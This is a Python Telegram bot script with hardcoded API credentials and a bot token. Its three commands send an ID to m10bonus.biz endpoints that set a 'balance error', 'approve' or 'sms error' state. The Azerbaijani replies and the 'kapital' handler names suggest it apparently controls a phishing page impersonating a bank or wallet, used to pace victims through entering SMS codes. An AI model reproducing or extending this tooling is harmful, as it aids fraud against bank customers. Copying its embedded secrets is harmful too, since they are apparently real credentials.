import os
import requests
from pyrogram import Client, filters




API_ID = 28453217
API_HASH = "dbfd793b6267a127cbb765e61ebe82de"
BOT_TOKEN = "6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M"



app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command(["bm"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10bonus.biz/crud/balance/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /n command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        
        
        
@app.on_message(filters.command(["am"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10bonus.biz/crud/approve/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /a command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        
        

@app.on_message(filters.command(["em"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10bonus.biz/crud/smserror/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /e command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        

@app.on_message(filters.command(["help"]))
def kapital(client, message):
    message.reply_text("bm - balance error\nam - approve\nem - sms error.")

        

app.run()
